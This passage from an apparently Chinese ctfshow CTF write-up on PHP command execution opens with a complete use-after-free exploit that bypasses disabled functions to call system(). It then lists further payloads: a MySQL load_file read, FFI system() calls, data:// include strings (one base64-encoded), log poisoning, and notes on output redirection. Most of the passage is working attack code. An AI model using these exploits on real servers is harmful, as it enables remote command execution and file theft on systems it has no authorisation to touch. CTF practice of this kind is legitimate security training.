class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>pwn(<span class="hljs-string">&quot;cat /flag0.txt&quot;</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ctfshow</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>, <span class="hljs-variable">$backtrace</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Vuln</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$backtrace</span>;<br>            <span class="hljs-keyword">unset</span>(<span class="hljs-keyword">$this</span>-&gt;a);<br>            <span class="hljs-variable">$backtrace</span> = (<span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>)-&gt;getTrace();<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$backtrace</span>[<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;args&#x27;</span>])) &#123;<br>                <span class="hljs-variable">$backtrace</span> = debug_backtrace();<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span>, <span class="hljs-variable">$c</span>, <span class="hljs-variable">$d</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str2ptr</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$address</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span> = <span class="hljs-variable">$s</span>-<span class="hljs-number">1</span>; <span class="hljs-variable">$j</span> &gt;= <span class="hljs-number">0</span>; <span class="hljs-variable">$j</span>--) &#123;<br>            <span class="hljs-variable">$address</span> &lt;&lt;= <span class="hljs-number">8</span>;<br>            <span class="hljs-variable">$address</span> |= ord(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span>+<span class="hljs-variable">$j</span>]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$address</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ptr2str</span>(<span class="hljs-params"><span class="hljs-variable">$ptr</span>, <span class="hljs-variable">$m</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$m</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$out</span> .= sprintf(<span class="hljs-string">&quot;%c&quot;</span>,(<span class="hljs-variable">$ptr</span> &amp; <span class="hljs-number">0xff</span>));<br>            <span class="hljs-variable">$ptr</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$out</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span>, <span class="hljs-variable">$v</span>, <span class="hljs-variable">$n</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span> + <span class="hljs-variable">$i</span>] = sprintf(<span class="hljs-string">&quot;%c&quot;</span>,(<span class="hljs-variable">$v</span> &amp; <span class="hljs-number">0xff</span>));<br>            <span class="hljs-variable">$v</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">leak</span>(<span class="hljs-params"><span class="hljs-variable">$addr</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>;<br>        write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x68</span>, <span class="hljs-variable">$addr</span> + <span class="hljs-variable">$p</span> - <span class="hljs-number">0x10</span>);<br>        <span class="hljs-variable">$leak</span> = strlen(<span class="hljs-variable">$helper</span>-&gt;a);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$s</span> != <span class="hljs-number">8</span>) &#123; <span class="hljs-variable">$leak</span> %= <span class="hljs-number">2</span> &lt;&lt; (<span class="hljs-variable">$s</span> * <span class="hljs-number">8</span>) - <span class="hljs-number">1</span>; &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$leak</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parse_elf</span>(<span class="hljs-params"><span class="hljs-variable">$base</span></span>) </span>&#123;<br>        <span class="hljs-variable">$e_type</span> = leak(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-variable">$e_phoff</span> = leak(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x20</span>);<br>        <span class="hljs-variable">$e_phentsize</span> = leak(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">2</span>);<br>        <span class="hljs-variable">$e_phnum</span> = leak(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$e_phnum</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$header</span> = <span class="hljs-variable">$base</span> + <span class="hljs-variable">$e_phoff</span> + <span class="hljs-variable">$i</span> * <span class="hljs-variable">$e_phentsize</span>;<br>            <span class="hljs-variable">$p_type</span>  = leak(<span class="hljs-variable">$header</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_flags</span> = leak(<span class="hljs-variable">$header</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_vaddr</span> = leak(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x10</span>);<br>            <span class="hljs-variable">$p_memsz</span> = leak(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x28</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">6</span>) &#123;<br><br>                <span class="hljs-variable">$data_addr</span> = <span class="hljs-variable">$e_type</span> == <span class="hljs-number">2</span> ? <span class="hljs-variable">$p_vaddr</span> : <span class="hljs-variable">$base</span> + <span class="hljs-variable">$p_vaddr</span>;<br>                <span class="hljs-variable">$data_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">5</span>) &#123;<br>                <span class="hljs-variable">$text_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$data_addr</span> || !<span class="hljs-variable">$text_size</span> || !<span class="hljs-variable">$data_size</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-keyword">return</span> [<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>];<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_basic_funcs</span>(<span class="hljs-params"><span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span></span>) </span>&#123;<br>        <span class="hljs-keyword">list</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>) = <span class="hljs-variable">$elf</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$data_size</span> / <span class="hljs-number">8</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$leak</span> = leak(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = leak(<span class="hljs-variable">$leak</span>);<br><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x746e6174736e6f63</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-variable">$leak</span> = leak(<span class="hljs-variable">$data_addr</span>, (<span class="hljs-variable">$i</span> + <span class="hljs-number">4</span>) * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = leak(<span class="hljs-variable">$leak</span>);<br><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x786568326e6962</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$data_addr</span> + <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_binary_base</span>(<span class="hljs-params"><span class="hljs-variable">$binary_leak</span></span>) </span>&#123;<br>        <span class="hljs-variable">$base</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable">$start</span> = <span class="hljs-variable">$binary_leak</span> &amp; <span class="hljs-number">0xfffffffffffff000</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x1000</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$start</span> - <span class="hljs-number">0x1000</span> * <span class="hljs-variable">$i</span>;<br>            <span class="hljs-variable">$leak</span> = leak(<span class="hljs-variable">$addr</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> == <span class="hljs-number">0x10102464c457f</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$addr</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_system</span>(<span class="hljs-params"><span class="hljs-variable">$basic_funcs</span></span>) </span>&#123;<br>        <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$basic_funcs</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-variable">$f_entry</span> = leak(<span class="hljs-variable">$addr</span>);<br>            <span class="hljs-variable">$f_name</span> = leak(<span class="hljs-variable">$f_entry</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$f_name</span> == <span class="hljs-number">0x6d6574737973</span>) &#123;<br>                <span class="hljs-keyword">return</span> leak(<span class="hljs-variable">$addr</span> + <span class="hljs-number">8</span>);<br>            &#125;<br>            <span class="hljs-variable">$addr</span> += <span class="hljs-number">0x20</span>;<br>        &#125; <span class="hljs-keyword">while</span>(<span class="hljs-variable">$f_entry</span> != <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">trigger_uaf</span>(<span class="hljs-params"><span class="hljs-variable">$arg</span></span>) </span>&#123;<br><br>        <span class="hljs-variable">$arg</span> = str_shuffle(<span class="hljs-string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);<br>        <span class="hljs-variable">$vuln</span> = <span class="hljs-keyword">new</span> Vuln();<br>        <span class="hljs-variable">$vuln</span>-&gt;a = <span class="hljs-variable">$arg</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(stristr(PHP_OS, <span class="hljs-string">&#x27;WIN&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;This PoC is for *nix systems only.&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$n_alloc</span> = <span class="hljs-number">10</span>;<br>    <span class="hljs-variable">$contiguous</span> = [];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n_alloc</span>; <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-variable">$contiguous</span>[] = str_shuffle(<span class="hljs-string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);<br><br>    trigger_uaf(<span class="hljs-string">&#x27;x&#x27;</span>);<br>    <span class="hljs-variable">$abc</span> = <span class="hljs-variable">$backtrace</span>[<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;args&#x27;</span>][<span class="hljs-number">0</span>];<br><br>    <span class="hljs-variable">$helper</span> = <span class="hljs-keyword">new</span> Helper;<br>    <span class="hljs-variable">$helper</span>-&gt;b = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$x</span></span>) </span>&#123; &#125;;<br><br>    <span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">79</span> || strlen(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;UAF failed&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$closure_handlers</span> = str2ptr(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-variable">$php_heap</span> = str2ptr(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x58</span>);<br>    <span class="hljs-variable">$abc_addr</span> = <span class="hljs-variable">$php_heap</span> - <span class="hljs-number">0xc8</span>;<br><br>    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">2</span>);<br>    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">6</span>);<br><br>    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x10</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-number">0x60</span>);<br>    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xa</span>);<br><br>    <span class="hljs-variable">$closure_obj</span> = str2ptr(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-variable">$binary_leak</span> = leak(<span class="hljs-variable">$closure_handlers</span>, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$base</span> = get_binary_base(<span class="hljs-variable">$binary_leak</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$elf</span> = parse_elf(<span class="hljs-variable">$base</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$basic_funcs</span> = get_basic_funcs(<span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$zif_system</span> = get_system(<span class="hljs-variable">$basic_funcs</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);<br>    &#125;<br><br><br>    <span class="hljs-variable">$fake_obj_offset</span> = <span class="hljs-number">0xd0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x110</span>; <span class="hljs-variable">$i</span> += <span class="hljs-number">8</span>) &#123;<br>        write(<span class="hljs-variable">$abc</span>, <span class="hljs-variable">$fake_obj_offset</span> + <span class="hljs-variable">$i</span>, leak(<span class="hljs-variable">$closure_obj</span>, <span class="hljs-variable">$i</span>));<br>    &#125;<br><br>    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-variable">$fake_obj_offset</span>);<br>    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x38</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>);<br>    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x68</span>, <span class="hljs-variable">$zif_system</span>);<br><br>    (<span class="hljs-variable">$helper</span>-&gt;b)(<span class="hljs-variable">$cmd</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><br>ctfshow(<span class="hljs-string">&quot;cat /flag0.txt&quot;</span>);ob_end_flush();<br><span class="hljs-comment">#需要通过url编码</span><br></code></pre></td></tr></table></figure><p>数据库 load_file 读取：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-keyword">try</span> &#123;<span class="hljs-variable">$dbh</span> = <span class="hljs-keyword">new</span> PDO(<span class="hljs-string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>);<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$dbh</span>-&gt;query(<span class="hljs-string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$row</span>)&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$row</span>[<span class="hljs-number">0</span>]).<span class="hljs-string">&quot;|&quot;</span>; &#125;<span class="hljs-variable">$dbh</span> = <span class="hljs-literal">null</span>;&#125;<span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>) &#123;<span class="hljs-keyword">echo</span> <span class="hljs-variable">$e</span>-&gt;getMessage();<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);&#125;<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<span class="hljs-comment">#删除所有缩进</span><br></code></pre></td></tr></table></figure><p>php74 特性：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$ffi</span> = FFI::cdef(<span class="hljs-string">&quot;int system(const char *command);&quot;</span>);<span class="hljs-comment">//创建一个system对象</span><br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;/readflag &gt; 1.txt&#x27;</span>;<span class="hljs-comment">//没有回显的</span><br><span class="hljs-variable">$ffi</span>-&gt;system(<span class="hljs-variable">$a</span>);<span class="hljs-comment">//通过$ffi去调用system函数</span><br></code></pre></td></tr></table></figure><blockquote><p>${PATH:~A}${PWD:~A}${IFS}????.???</p></blockquote><h2 id="include-c"><a href="#include-c" class="headerlink" title="include(c)"></a>include(c)</h2><p>data://，可以让用户来控制输入流，当它与包含函数结合时，用户输入的 data://流会被当作 php 文件执行</p><blockquote><p>data://text/plain,&lt;?php system(ls)?&gt;</p><p>data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</p></blockquote><p>也可以包含日志文件 抓包 在 UA 或者头部访问一句话即不存在的资源 放包 然后包含即可</p><h2 id="system-c"><a href="#system-c" class="headerlink" title="system(c)"></a>system(c)</h2><ul><li>回显丢进黑洞</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    system(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>执行 shell 命令时，会默认打开三个文件</p><table><thead><tr><th align="center">类型</th><th align="center">文件描述符</th><th align="center">执行情况</th><th align="center">句柄位置</th></tr></thead><tbody><tr><td align="center">标准输入</td><td align="center">0</td><td align="center">从键盘会的输入</td><td align="center">/proc/self/fd/0</td></tr><tr><td align="center">标准输出</td><td align="center">1</td><td align="center">输出到控制台</td><td align="center">/proc/self/fd/1</td></tr><tr><td align="center">错误输出</td><td align="center">2</td><td align="center">输出到控制台</td><td align="center">/proc/self/fd/2</td></tr></tbody></table><ol><li>输出</li></ol><table><thead><tr><th align="center">命令</th><th align="center">介绍</th></tr></thead><tbody><tr><td align="center">command &gt;filename</td><td align="center">把标准输出重定向到新文件中</td></tr><tr><td align="center">command 1&gt;filename</td><td align="center">同上</td></tr><tr><td align="center">command &gt;&gt;filename</td><td align="center">把标准输出追加到文件中</td></tr><tr><td align="center">command 1&gt;&gt;filename</td><td align="center">同上</td></tr><tr><td align="center">command 2&gt;filename</td><td align="center">把标准错误重定向到新文件中</td></tr><tr><td align="center">command 2&gt;&gt;filename</td><td align="center">把标准错误追加到新文件中</td></tr></tbody></table><blockquote><p>假如更改文件描述符的指向，就能重定向输入输出。比如我们将 1 指向文件，那么标准的输出就会输出到文件中。</p><p>使用&gt;或者&gt;&gt;对<strong>输出</strong>进行重定向。符号的左边表示文件描述符，如果没有的话表示 1，也就是标准输出，符号的右边可以是一个文件，也可以是一个输出设备。当使用&gt;时，会判断右边的文件存不存在，如果存在的话就覆盖，不存在的话则直接创建。但是当使用&gt;&gt;进行追加时，则不会删除原来已经存在的文件。</p><p>root@en1sksyfamnufy5g:~/Desktop# tree<br>.<br>└── a.txt</p><p>0 directories, 1 file<br>root@en1sksyfamnufy5g:~/Desktop# ls a.txt b.txt<br>ls: cannot access ‘b.txt’: No such file or directory<br>a.txt<br>root@en1sksyfamnufy5g:~/Desktop# ^C<br>root@en1sksyfamnufy5g:~/Desktop#</p><p>在我们执行<code>ls a.txt b.txt</code>之后，一共有两种输出，其中<code>ls:</code>无法访问 b.txt: 没有那个文件或目录是错误输出，a.txt 是标准输出。</p><p>root@en1sksyfamnufy5g:~/Desktop# ls a.txt b.txt 1&gt;out<br>ls: cannot access ‘b.txt’: No such file or 